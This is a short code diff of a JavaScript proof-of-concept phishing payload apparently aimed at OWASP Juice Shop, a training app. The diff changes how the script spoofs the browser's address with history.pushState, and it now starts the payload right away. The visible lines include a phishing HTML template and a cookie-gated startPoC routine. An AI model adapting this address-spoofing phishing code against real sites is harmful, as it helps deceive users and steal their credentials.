@@ -1,4 +1,3 @@
-window.history.pushState({}, 'OWASP Juice Shop', 'https://preview.owasp-juice.shop/#/search');
 let runOnce = false;
 const phishHtml = `
 <style>
@@ -106,9 +105,8 @@ function checkDOM() {
     startPoC();
   }
 }
-window.addEventListener('load', function() {
-  checkDOM();
-});
+history.pushState(null, 'OWASP Juice Shop', 'https://preview.owasp-juice.shop/#/search');
+checkDOM();
 function startPoC() {
   // [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
   if ((runOnce) && !(/^(.*;)?\s*winPhi\s*=\s*[^;]/.test(document.cookie))) {
